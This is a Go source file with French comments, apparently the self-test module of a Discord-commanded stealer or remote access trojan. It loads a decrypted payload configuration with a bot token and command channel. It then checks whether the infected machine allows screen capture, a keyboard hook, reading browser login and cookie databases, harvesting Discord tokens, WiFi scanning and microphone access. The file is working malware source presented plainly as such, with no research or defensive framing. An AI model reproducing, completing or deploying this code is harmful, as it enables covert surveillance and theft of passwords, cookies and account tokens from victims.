// probe.go — autodiagnostic hors Discord.
//
// `exe -probe` écrit un rapport dans %TEMP%\payload-probe.txt : configuration
// déchiffrée, dossier de travail réellement inscriptible, salons résolus,
// crochet clavier, capture d'écran, bases navigateurs lisibles, micro.
// C'est ce qui permet de vérifier une machine sans passer par le C2.
package main

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// probe écrit une ligne dans le rapport.
func probe(b *strings.Builder, ok bool, label, detail string) {
	mark := "KO"
	if ok {
		mark = "OK"
	}
	fmt.Fprintf(b, "[%s] %s%s\n", mark, label, func() string {
		if detail == "" {
			return ""
		}
		return " — " + detail
	}())
}

// runProbe exécute l'autodiagnostic et rend le chemin du rapport.
func runProbe() string {
	var b strings.Builder
	fmt.Fprintf(&b, "SONDE %s\n\n", time.Now().Format("02/01/2006 15:04:05"))

	// 1. Configuration.
	cfg = loadPayloadConfig()
	probe(&b, cfg.Enabled, "config enabled", fmt.Sprintf("%v", cfg.Enabled))
	probe(&b, cfg.BotToken != "", "jeton bot", truncate(cfg.BotToken, 12)+"…")
	probe(&b, cfg.ChannelID != "", "channel_id", cfg.ChannelID)
	probe(&b, cfg.GuildID != "", "guild_id", cfg.GuildID)

	// 2. Dossier de travail.
	dir := workDir()
	probe(&b, dir != "", "workDir()", dir)
	f, err := os.Create(filepath.Join(dir, "probe-test.txt"))
	if err == nil {
		_, _ = f.WriteString("ok")
		f.Close()
		probe(&b, true, "écriture workDir", filepath.Join(dir, "probe-test.txt"))
	} else {
		probe(&b, false, "écriture workDir", err.Error())
	}
	// 3. Journal.
	plog("sonde: démarrage")
	logFile := filepath.Join(dir, "logs", "sys.log")
	if st, err := os.Stat(logFile); err == nil {
		probe(&b, st.Size() > 0, "journal logs/sys.log", fmt.Sprintf("%d octets", st.Size()))
	} else {
		probe(&b, false, "journal logs/sys.log", "absent : "+err.Error())
	}

	// 4. Salons.
	ch := targetChannel()
	probe(&b, ch != "", "salon de commande", ch)
	probe(&b, true, "salons résolus", fmt.Sprintf("%d/%d", channelsReady(), len(allChannelNames())))

	// 5. Captures.
	t0 := time.Now()
	shots := captureScreensPNG()
	probe(&b, len(shots) > 0 && len(shots[0]) > 1024, "capture d'écran",
		fmt.Sprintf("%d écran(s), %d ms", len(shots), time.Since(t0).Milliseconds()))

	// 6. Clavier.
	go keyboardHookLoop()
	time.Sleep(600 * time.Millisecond)
	probe(&b, hookActive.Load(), "crochet clavier", onOff(hookActive.Load()))

	// 7. Bases navigateurs.
	for _, br := range browsers() {
		profs := profiles(br.Root)
		ok := 0
		total := 0
		for _, p := range profs {
			for _, name := range []string{"Login Data", "Network/Cookies", "Cookies"} {
				src := filepath.Join(p, filepath.FromSlash(name))
				if _, err := os.Stat(src); err == nil {
					total++
					if d, err := os.ReadFile(src); err == nil && len(d) > 0 {
						ok++
					}
				}
			}
		}
		if total > 0 {
			probe(&b, ok > 0, "navigateur "+br.Name,
				fmt.Sprintf("%d/%d bases lisibles", ok, total))
		}
	}

	// 8. Jetons Discord.
	toks := discordTokens(filepath.Join(os.Getenv("APPDATA"), "discord"))
	probe(&b, len(toks) > 0, "jetons Discord", fmt.Sprintf("%d trouvé(s)", len(toks)))

	// 9. WiFi.
	n := len(wifiScan())
	probe(&b, n > 0, "bornes WiFi visibles", fmt.Sprintf("%d", n))

	// 10. Micro (ouverture seulement, pas d'enregistrement).
	if pcm, _, err := recordMic(1); err == nil && len(pcm) > 0 {
		probe(&b, true, "micro", fmt.Sprintf("%d octets captés", len(pcm)))
	} else {
		probe(&b, false, "micro", "indisponible")
	}

	out := filepath.Join(os.Getenv("TEMP"), "payload-probe.txt")
	if err := os.WriteFile(out, []byte(b.String()), 0644); err != nil {
		// Repli : à côté de l exécutable, puis dans le dossier de travail.
		alt := filepath.Join(filepath.Dir(currentExe()), "payload-probe.txt")
		if err2 := os.WriteFile(alt, []byte(b.String()), 0644); err2 == nil {
			return alt
		}
		alt = filepath.Join(workDir(), "payload-probe.txt")
		_ = os.WriteFile(alt, []byte(b.String()), 0644)
		return alt
	}
	return out
}

// probeJSON est utilisé par le mode -probe -json (facultatif).
func probeJSON() string {
	cfg = loadPayloadConfig()
	m := map[string]any{
		"enabled":  cfg.Enabled,
		"channel":  cfg.ChannelID,
		"guild":    cfg.GuildID,
		"workdir":  workDir(),
		"channels": channelsReady(),
	}
	b, _ := json.Marshal(m)
	return string(b)
}
